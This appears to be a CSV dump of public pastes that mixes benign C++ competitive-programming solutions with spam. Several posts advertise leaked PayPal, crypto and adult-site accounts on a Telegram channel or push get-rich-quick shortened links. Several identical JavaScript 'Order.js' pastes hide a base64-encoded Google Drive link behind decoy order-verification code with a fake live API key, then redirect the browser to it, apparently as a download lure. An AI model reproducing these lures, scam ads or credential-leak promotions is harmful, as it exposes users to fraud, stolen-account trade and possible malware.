id,title,username,language,date,content
HEfuh6v1,Up and Down,tepyotin2,C++,Thursday 1st of May 2025 06:53:15 PM CDT,"#include <iostream>
#include <queue>
#include <vector>
#include <cstring>

using namespace std;

int main() {
    while (true) {
        int N, A, B;
        cin >> N;
        if (N == 0) break;

        cin >> A >> B;

        vector<int> K(N + 1);  // Floor indices from 1 to N
        for (int i = 1; i <= N; ++i) {
            cin >> K[i];
        }

        vector<int> visited(N + 1, -1);  // visited[i] = number of presses to reach floor i
        queue<int> q;

        q.push(A);
        visited[A] = 0;

        while (!q.empty()) {
            int current = q.front();
            q.pop();

            if (current == B) break;

            int up = current + K[current];
            int down = current - K[current];

            if (up <= N && visited[up] == -1) {
                visited[up] = visited[current] + 1;
                q.push(up);
            }

            if (down >= 1 && visited[down] == -1) {
                visited[down] = visited[current] + 1;
                q.push(down);
            }
        }

        cout << visited[B] << endl;
    }

    return 0;
}
"
b8CWeu1k,EARN $900 INSTANTLY 2025 95,anjo22,JavaScript,Thursday 1st of May 2025 06:52:56 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Q71yJCXHJl
"
PADHxq0b,Floodfill,tepyotin2,C++,Thursday 1st of May 2025 06:52:37 PM CDT,"#include <iostream>
#include <queue>
#include <vector>

using namespace std;

// Directions: up, down, top-left, bottom-right
int dx[] = {-1, 1, -1, 1};
int dy[] = {0, 0, -1, 1};

int main() {
    int n, x, y;
    cin >> n >> x >> y;

    vector<vector<int>> maze(n, vector<int>(n));
    vector<vector<bool>> visited(n, vector<bool>(n, false));

    // Read the maze
    for (int i = 0; i < n; ++i)
        for (int j = 0; j < n; ++j)
            cin >> maze[i][j];

    // Check if starting point is blocked
    if (maze[x][y] == 1) {
        cout << 0 << endl;
        return 0;
    }

    int count = 0;
    queue<pair<int, int>> q;
    q.push({x, y});
    visited[x][y] = true;

    while (!q.empty()) {
        auto [cx, cy] = q.front(); q.pop();
        count++;

        for (int i = 0; i < 4; ++i) {
            int nx = cx + dx[i];
            int ny = cy + dy[i];

            if (nx >= 0 && nx < n && ny >= 0 && ny < n &&
                !visited[nx][ny] && maze[nx][ny] == 0) {
                visited[nx][ny] = true;
                q.push({nx, ny});
            }
        }
    }

    cout << count << endl;
    return 0;
}
"
59V7B4V5,Virus,tepyotin2,C++,Thursday 1st of May 2025 06:51:54 PM CDT,"#include <iostream>
#include <queue>
using namespace std;

int main() {
    int n;
    long long k;
    cin >> n >> k;

    vector<int> a(n);
    for (int i = 0; i < n; i++)
        cin >> a[i];

    queue<int> q;
    long long currentSum = 0;
    int maxLength = 0;

    for (int i = 0; i < n; ++i) {
        q.push(a[i]);
        currentSum += a[i];

        while (currentSum > k) {
            currentSum -= q.front();
            q.pop();
        }

        maxLength = max(maxLength, (int)q.size());
    }

    cout << maxLength << endl;
    return 0;
}
"
iRFskk6c,Injection,tepyotin2,C++,Thursday 1st of May 2025 06:51:21 PM CDT,"#include <iostream>
#include <queue>
#include <vector>

using namespace std;

int main() {
    int n;
    cin >> n;
    
    queue<int> q;
    vector<int> result;
    
    for (int i = 1; i <= n; ++i) {
        q.push(i);
    }
    
    while (q.size() >= 2) {
        // The first person gets injected
        int injected = q.front();
        q.pop();
        result.push_back(injected);
        
        // The next person escapes to the end
        int escaped = q.front();
        q.pop();
        q.push(escaped);
    }
    
    // Add the last remaining person
    if (!q.empty()) {
        result.push_back(q.front());
        q.pop();
    }
    
    // Output the result
    for (size_t i = 0; i < result.size(); ++i) {
        if (i != 0) {
            cout << "" "";
        }
        cout << result[i];
    }
    cout << endl;
    
    return 0;
}"
J3vSG1R2,Leaked Accounts - Fresh Hits,dentira,JavaScript,Thursday 1st of May 2025 06:50:59 PM CDT,52468 Accounts Posted On https://t.me/leakzbyeminem
jYw9XSjw,Products.js,dentira,JavaScript,Thursday 1st of May 2025 06:50:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52637/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kkht28XM,Sum Of Two Values,tepyotin2,C++,Thursday 1st of May 2025 06:49:57 PM CDT,"#include <iostream>
#include <unordered_map>
using namespace std;

int main() {
    int n;
    long long x;
    cin >> n >> x;

    unordered_map<long long, int> seen;
    for (int i = 1; i <= n; ++i) {
        long long num;
        cin >> num;
        long long complement = x - num;

        if (seen.count(complement)) {
            // Found the pair
            cout << seen[complement] << "" "" << i << endl;
            return 0;
        }

        seen[num] = i;
    }

    cout << ""IMPOSSIBLE"" << endl;
    return 0;
}
"
htfhQSjT,Distinct Numbers,tepyotin2,C++,Thursday 1st of May 2025 06:49:20 PM CDT,"#include <iostream>
#include <unordered_set>

int main() {
    int n;
    std::cin >> n;
    std::unordered_set<int> distinct_numbers;
    
    for (int i = 0; i < n; ++i) {
        int x;
        std::cin >> x;
        distinct_numbers.insert(x);
    }

    std::cout << distinct_numbers.size() << std::endl;
    return 0;
}
"
PRKvTcmY,Collecting Inputs,tepyotin2,C++,Thursday 1st of May 2025 06:48:32 PM CDT,"#include <iostream>
#include <sstream>
using namespace std;

int main() {
    string line;
    // Read input line by line
    while (getline(cin, line)) {
        istringstream iss(line);
        int a, b;
        if (iss >> a) {
            if (iss >> b) {
                // Case: two numbers on the line
                cout << (a + b) << endl;
            } else {
                // Case: only one number on the line, sum its digits
                int sum = 0;
                while (a != 0) {
                    sum += a % 10;
                    a /= 10;
                }
                cout << sum << endl;
            }
        }
    }
    return 0;
}
"
BHHDuETm,Counting Rooms,tepyotin2,C++,Thursday 1st of May 2025 06:47:50 PM CDT,"#include <bits/stdc++.h>

using namespace std;

int n, m;
char grid[1001][1001];
bool visited[1001][1001];
int dx[] = {-1, 1, 0, 0};
int dy[] = {0, 0, 1, -1};
int ans;

void dfs(int x, int y){
	if(visited[x][y] || x<0 || x>n-1 || y<0 || y>m-1){
		return;
	}
	//cout << ""x: "" << x << "", y: "" << y << '\n';
	visited[x][y] = true;
	for(int i=0; i<4; i++){
		int nx = x+dx[i];
		int ny = y+dy[i];
		//cout << ""nx: "" << nx << "", ny: "" << ny << '\n';
		if(!visited[nx][ny] && nx>=0 && nx<=n-1 && ny>=0 && ny<=m-1 && grid[nx][ny] == '.'){
			dfs(nx, ny);
		}
	}
}

int main(){
	//freopen(""rooms.in"", ""r"", stdin);
	
	cin >> n >> m;
	string s;
	for(int i=0; i<n; i++){
		cin >> s;
		for(int j=0; j<m; j++){
			grid[i][j] = s[j];
			//if(grid[i][j] == '.') cout << "" "";
			//cout << grid[i][j];
		}
		//cout << '\n';
	}
	for(int i=0; i<n; i++){
		for(int j=0; j<m; j++){
			if(!visited[i][j] && grid[i][j] == '.'){
				//cout << ""i: "" << i << "", j: "" << j << "", grid[i][j]: "" << grid[i][j] << '\n';
				ans++;
				dfs(i, j);
			}
		}
	}
	cout << ans << '\n';
	
	return 0;
}
"
yLPbehmm,"[Super Beginner-Friendly] How to Pull in $2,500 Monthly",Dominik013,PHP,Thursday 1st of May 2025 06:47:22 PM CDT,"-->  tinyurl.com/yc5abnrt  <--



RS50XP7

"
cQHFuvQx,Letters,tepyotin2,C++,Thursday 1st of May 2025 06:47:08 PM CDT,"#include <bits/stdc++.h>

using namespace std;

int n, m;
char grid[21][21];
bool visited[27];
int dx[] = {-1, 1, 0, 0};
int dy[] = {0, 0, 1, -1};
int ans;

void dfs(int x, int y, int counter){
	if(visited[grid[x][y]-'A'] || x<0 || x>=n || y<0 || y>=m){
		return;
	}
	//visited[x][y] = true;
	//counter++;
	visited[grid[x][y]-'A'] = true;
	ans = max(ans, counter);
	for(int i=0; i<4; i++){
		int nx = x+dx[i];
		int ny = y+dy[i];
		if(!visited[grid[nx][ny]-'A'] && nx>=0 && nx<n && ny>=0 && ny<m){
			counter++;
			//cout << ""nx: "" << nx << "", ny: "" << ny << "", grid[nx][ny]: "" << grid[nx][ny] << "", counter: "" << counter << '\n';
			//visited[grid[x][y]-'A'] = true;a
			dfs(nx, ny, counter);
			counter--;
			//visited[grid[x][y]-'A'] = false;
		}
	}
	//counter--;
	visited[grid[x][y]-'A'] = false;
}

int main(){
	//freopen(""letters.in"", ""r"", stdin);
	
	cin >> n >> m;
	string s;
	for(int i=0; i<n; i++){
		cin >> s;
		for(int j=0; j<m; j++){
			grid[i][j] = s[j];
		}
	}
	//for(int i=0; i<n; i++){
		//for(int j=0; j<m; j++){
			//cout << ""i: "" << i << "", j: ""<< j << "", grid[i][j]: "" << grid[i][j] << '\n';
			//memset(visited, false, sizeof(visited));
			//dfs(i, j, 1);
		//}
	//}
	dfs(0, 0, 1);
	cout << ans << '\n';
	
	return 0;
}
"
y7Q5bAcB,Optimal Work Division,tepyotin2,C++,Thursday 1st of May 2025 06:46:23 PM CDT,"#include <bits/stdc++.h>

using namespace std;

int n, k;
int task[21];
vector<int> mach;
int ans = INT_MAX;

void dfs(int idx){
	if(idx==n){
		int value = *max_element(mach.begin(), mach.end());
		ans = min(ans, value);
		return;
	}
	for(int i=0; i<k; i++){
		if(mach[i]+task[idx]<=ans){
			mach[i]+=task[idx];
			dfs(idx+1);
			mach[i]-=task[idx];
		}
		if(mach[i]==0) break;
	}
}

int main(){
	//freopen(""workdivision.in"", ""r"", stdin);
	
	cin >> n >> k;
	mach.resize(k, 0);
	for(int i=0; i<n; i++){
		cin >> task[i];
	}
	sort(task, task+n, greater<int>());
	//for(int i=0; i<n; i++){
		//cout << task[i] << '\n';
	//}
	dfs(0);
	cout << ans << '\n';
	
	return 0;
}
"
5tBF1uRq,Make $1000 15-MINUTES (BEGINNER) L4,anjo22,JavaScript,Thursday 1st of May 2025 06:43:42 PM CDT," 
Pdf https://tinyurl.com/freshleaks

40hTrclB0W
"
WeB1yhKr,Chaturbate with Tokens,dentira,JavaScript,Thursday 1st of May 2025 06:35:37 PM CDT,92891 Accounts Posted On https://t.me/leakzbyeminem
YCrtuZ7E,Order.js,dentira,JavaScript,Thursday 1st of May 2025 06:35:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36411/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8fLqPnq9,EARN $900 INSTANTLY 2025⭐ GV,anjo22,JavaScript,Thursday 1st of May 2025 06:34:27 PM CDT," 
Pdf https://tinyurl.com/freshleaks

3FeeZSV284
"
8Uw9WxFc,"$4,000 a Day – The Only Guide You’ll Ever Need",Dominik013,PHP,Thursday 1st of May 2025 06:32:22 PM CDT,"https://rentry.co/axg7zbrc



4U552JV

"
6DPAhLH3,"[Zero Effort] Earn $3,000 a Month Without Leaving Your House",Dominik013,PHP,Thursday 1st of May 2025 06:29:04 PM CDT,"-->  tinyurl.com/yc5abnrt  <--



88PUVJ7

"
0utV7gLk,Make $1000 15-MINUTES (BEGINNER) L4,gard2f,JavaScript,Thursday 1st of May 2025 06:24:53 PM CDT," 
Pdf https://tinyurl.com/freshleaks

VgQeLVts3J
"
VRVfAzkM,Crypto Accounts,dentira,JavaScript,Thursday 1st of May 2025 06:20:15 PM CDT,79437 Accounts Posted On https://t.me/leakzbyeminem
5Cky20V4,Market.js,dentira,JavaScript,Thursday 1st of May 2025 06:20:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56839/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gpjbBW79,PayPal with Balance,dentira,JavaScript,Thursday 1st of May 2025 06:04:54 PM CDT,46453 Accounts Posted On https://t.me/leakzbyeminem
N3yTjUrF,Untitled,dentira,JavaScript,Thursday 1st of May 2025 06:04:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22560/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JZbDEmKn,PayPal with Balance,Epiphemeral,JavaScript,Thursday 1st of May 2025 05:48:07 PM CDT,26620 Accounts Posted On https://t.me/leakzbyeminem
hPqjZk68,Untitled,Epiphemeral,JavaScript,Thursday 1st of May 2025 05:48:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61517/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Rzk2H78a,Chaturbate with Tokens,luqlegal,JavaScript,Thursday 1st of May 2025 05:37:57 PM CDT,20881 Accounts Posted On https://t.me/leakzbyeminem
8F6YWiqY,Order.js,iLoveToWatch,JavaScript,Thursday 1st of May 2025 05:37:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50789/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DTr573Yj,Crypto Accounts,luqlegal,JavaScript,Thursday 1st of May 2025 05:22:35 PM CDT,13759 Accounts Posted On https://t.me/leakzbyeminem
